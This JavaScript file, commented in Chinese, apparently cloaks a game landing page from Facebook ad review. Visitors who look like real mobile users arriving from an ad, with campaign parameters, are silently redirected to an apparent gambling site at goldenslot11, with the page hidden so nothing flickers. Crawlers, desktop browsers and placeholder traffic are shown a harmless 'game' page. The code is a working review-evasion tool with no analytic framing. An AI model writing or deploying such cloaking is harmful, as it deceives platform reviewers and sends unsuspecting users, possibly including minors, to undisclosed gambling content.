(function() {
    // 【配置：跳转目标地址】
    var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6"; 

    function isRealPlayer() {
        var urlObj = new URLSearchParams(window.location.search);
        var searchRaw = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();

        // --- 1. 占位符死刑 ---
        if (searchRaw.indexOf('%7b%7b') > -1 || searchRaw.indexOf('{{') > -1) return false;

        // --- 2. 核心字段深度校验 (防空格、防空值) ---
        var requiredKeys = ['fbclid', 'pixel', 'apkch', 'campaign', 'adgroup', 'creative'];
        
        for (var i = 0; i < requiredKeys.length; i++) {
            var key = requiredKeys[i];
            var value = urlObj.get(key);

            // 校验逻辑：
            // a. 必须存在该字段
            // b. 去掉空格后不能为空
            // c. 长度必须大于 2 (防止 campaign=a 或 campaign=%20 这种无效值)
            if (!value || value.trim().length <= 2) {
                console.log("拦截：字段 " + key + " 无效或为空格");
                return false;
            }
        }

        // --- 3. 环境过滤 ---
        // 必须是移动端
        var isMobile = /iphone|ipad|ipod|android/.test(ua);
        if (!isMobile) return false;

        // 排除 Facebook 爬虫
        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;

        // --- 4. 屏幕指纹 ---
        if (window.screen.width === 0 || window.innerHeight === 0) return false;

        return true; 
    }

    // --- 执行逻辑 ---
    if (isRealPlayer()) {
        // 【防闪烁补丁】在跳转动作前，瞬间隐藏页面所有内容
        document.documentElement.style.display = 'none';

        var connector = config_target.indexOf('?') > -1 ? '&' : '?';
        var finalUrl = config_target + connector + window.location.search.substring(1);
        
        // 瞬间替换
        window.location.replace(finalUrl);
        
        // 停止后续解析
        if (window.stop) window.stop();
    } else {
        console.log("Verified: Game Content Loaded.");
        // 只有不跳转时才显示 Body（配合 HTML 中的隐藏样式）
        document.documentElement.style.display = 'block';
        if (typeof init === 'function') init();
    }
})();
